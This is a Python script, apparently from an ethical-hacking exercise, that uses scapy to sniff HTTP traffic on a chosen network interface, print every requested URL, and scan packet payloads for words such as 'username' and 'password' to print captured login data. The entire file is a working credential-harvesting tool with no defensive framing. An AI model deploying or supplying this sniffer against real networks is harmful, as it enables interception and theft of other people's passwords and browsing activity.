#!/usr/bin/env/ python

# module optparse to get arguments from line

import optparse

# module scapy for arp requests and packet sniffing

import scapy.all as scapy
from scapy.layers import http

# get arguments from command line


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-i", "--interface", dest="interface", help="Interface for packet sniffing")
    (options, arguments) = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface for packet sniffing, use --help for more info")
    return options


# sniff data

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


# get the url of the packet

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


# getting login info


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass", "email"]
        for keyword in keywords:
            if keyword in load:
                return load


# call back function


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP REQUEST >> " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")


# return arguments and start sniffing
options = get_arguments()
sniff(options.interface)
